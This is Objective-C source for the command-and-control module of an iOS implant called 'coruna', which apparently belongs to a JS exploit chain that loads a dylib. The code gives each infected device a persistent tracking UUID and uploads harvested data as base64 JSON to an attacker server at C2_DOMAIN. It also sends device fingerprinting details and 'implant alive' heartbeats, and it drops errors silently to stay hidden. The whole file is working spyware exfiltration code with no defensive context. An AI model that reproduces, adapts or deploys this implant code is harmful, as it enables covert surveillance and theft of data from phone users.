/*
 * c2.c — C2 communication via NSURLSession (Objective-C, compiled with -x objective-c)
 *
 * Sends JSON to the Go /upload endpoint:
 *   POST https://C2_DOMAIN/upload
 *   Content-Type: application/json
 *   X-Device-UUID: <persistent uuid>
 *   Body: {"deviceUUID":"…","category":"…","path":"…","description":"…","data":"<b64>"}
 */

#import <Foundation/Foundation.h>
#include <sys/utsname.h>
#include <sys/sysctl.h>
#include "c2.h"

/* --------------------------------------------------------------------------
 * Persistent device UUID.
 *
 * Priority order:
 *   1. __ds_dsid  — UUID written by the JS chain into sessionStorage (then
 *                   bridged into NSUserDefaults by Stage3_VariantB before
 *                   dlopen so the dylib shares the same UUID as the chain).
 *   2. __cru_id   — previously persisted dylib UUID (survives app restarts).
 *   3. Fresh UUID — first run, stored under __cru_id for next time.
 *
 * This ensures that data uploaded by the dylib appears under the same device
 * entry in the Admin UI as the JS-chain chain_result records.
 * -------------------------------------------------------------------------- */
static NSString *coruna_device_uuid(void) {
    static NSString *cached = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        NSUserDefaults *d = [NSUserDefaults standardUserDefaults];
        // Prefer the UUID set by the JS chain (Stage3 writes __ds_dsid before dlopen)
        NSString *u = [d stringForKey:@"__ds_dsid"];
        if (!u || u.length < 8) {
            // Fall back to previously persisted dylib UUID
            u = [d stringForKey:@"__cru_id"];
        }
        if (!u || u.length < 8) {
            // First run — generate and persist a fresh UUID
            u = [[NSUUID UUID] UUIDString];
        }
        // Always persist under __cru_id so we survive sessionStorage being cleared
        [d setObject:u forKey:@"__cru_id"];
        [d synchronize];
        cached = u;
    });
    return cached;
}

/* --------------------------------------------------------------------------
 * Safe UTF-8 conversion — stringWithUTF8String: returns nil on invalid bytes,
 * which would crash NSDictionary initialisation.  This helper falls back to
 * an empty string so the upload is never dropped due to encoding issues.
 * -------------------------------------------------------------------------- */
static NSString *c2_safe_str(const char *s) {
    if (!s) return @"";
    NSString *r = [NSString stringWithUTF8String:s];
    return r ? r : @"";
}

/* --------------------------------------------------------------------------
 * Core upload function.
 * Blocks for up to 15 s; silently drops on error (implant must not crash host).
 * -------------------------------------------------------------------------- */
void upload_to_c2(const char *category, const char *path,
                  const char *description, const char *b64data) {
    @autoreleasepool {
        NSString *scheme = C2_USE_HTTPS ? @"https" : @"http";
        NSString *urlStr = [NSString stringWithFormat:@"%@://%s%s",
                            scheme, C2_DOMAIN, C2_UPLOAD];
        NSURL *url = [NSURL URLWithString:urlStr];
        if (!url) return;

        NSString *uuid = coruna_device_uuid();

        NSDictionary *bodyDict = @{
            @"deviceUUID":  uuid,
            @"category":    c2_safe_str(category    ?: "data"),
            @"path":        c2_safe_str(path        ?: ""),
            @"description": c2_safe_str(description ?: ""),
            @"data":        c2_safe_str(b64data     ?: ""),
        };
        NSData *body = [NSJSONSerialization dataWithJSONObject:bodyDict
                                                       options:0 error:nil];
        if (!body) return;

        NSMutableURLRequest *req =
            [NSMutableURLRequest requestWithURL:url
                                    cachePolicy:NSURLRequestReloadIgnoringLocalCacheData
                                timeoutInterval:15.0];
        [req setHTTPMethod:@"POST"];
        [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
        [req setValue:uuid forHTTPHeaderField:@"X-Device-UUID"];
        [req setHTTPBody:body];

        dispatch_semaphore_t sem = dispatch_semaphore_create(0);
        NSURLSessionConfiguration *cfg =
            [NSURLSessionConfiguration ephemeralSessionConfiguration];
        cfg.timeoutIntervalForRequest  = 15.0;
        cfg.timeoutIntervalForResource = 15.0;

        NSURLSession *session = [NSURLSession sessionWithConfiguration:cfg];
        [[session dataTaskWithRequest:req
                    completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
            (void)d; (void)r; (void)e;
            dispatch_semaphore_signal(sem);
        }] resume];

        dispatch_semaphore_wait(sem,
            dispatch_time(DISPATCH_TIME_NOW, 15 * NSEC_PER_SEC));
        [session invalidateAndCancel];
    }
}

/* --------------------------------------------------------------------------
 * Device info — sent once on first contact so C2 can identify the device
 * before any harvest data arrives.
 * -------------------------------------------------------------------------- */
void upload_device_info(void) {
    @autoreleasepool {
        struct utsname un;
        uname(&un);

        /* iOS version via sysctlbyname("kern.osproductversion") */
        char ios_ver[64] = "unknown";
        size_t vs = sizeof(ios_ver);
        sysctlbyname("kern.osproductversion", ios_ver, &vs, NULL, 0);

        char kern_ver[256] = "unknown";
        size_t ks = sizeof(kern_ver);
        sysctlbyname("kern.version", kern_ver, &ks, NULL, 0);

        NSDictionary *info = @{
            @"machine":      @(un.machine),    /* e.g. "iPhone15,2" */
            @"sysname":      @(un.sysname),    /* "Darwin" */
            @"release":      @(un.release),    /* "23.2.0" */
            @"ios_version":  @(ios_ver),       /* "17.2" */
            @"kern_version": @(kern_ver),      /* full kern.version string */
        };

        NSData *json  = [NSJSONSerialization dataWithJSONObject:info options:0 error:nil];
        if (!json) return;
        NSString *b64 = [json base64EncodedStringWithOptions:0];
        upload_to_c2("system", "/coruna/device_info",
                     "Device identification", b64.UTF8String);
    }
}

/* --------------------------------------------------------------------------
 * Heartbeat — confirms implant is alive; data = base64("heartbeat")
 * -------------------------------------------------------------------------- */
void c2_heartbeat(void) {
    upload_to_c2("system", "/coruna/heartbeat", "coruna implant alive",
                 "aGVhcnRiZWF0"); /* base64("heartbeat") */
}

/* --------------------------------------------------------------------------
 * Legacy stub — old raw-socket callers compile without changes.
 * -------------------------------------------------------------------------- */
void send_to_c2(const uint8_t *data, size_t len) {
    (void)data; (void)len;
}
